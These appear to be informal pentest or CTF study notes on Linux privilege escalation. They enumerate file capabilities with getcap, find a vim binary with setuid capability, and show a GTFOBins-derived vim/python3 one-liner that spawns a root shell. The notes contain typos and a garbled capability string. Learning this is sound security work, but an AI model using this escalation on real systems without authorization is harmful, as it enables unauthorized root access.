lsit all enabled capabiliites
> getcap -r / 2>/dev/null

- when ran as unprivilaged user - will generate a massive amount of errors, so best practice to always include 2>/dev/null

- the output to identify caps that reflect
 - '/home/user/vim = cap+setuid+ep'

- in the above vim is the targeted system on the users box
- finding the capability on gtfobins it shows a pythong script

to find the pythong script on target machine
> which python
 - no output
 > which python2
 - no output
 > which pyhton3
 /usr/bin/pyhton3

 - which tells us to change the gtfobins script to :py3 per the directions - the script will look like:
> ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
> whoami
root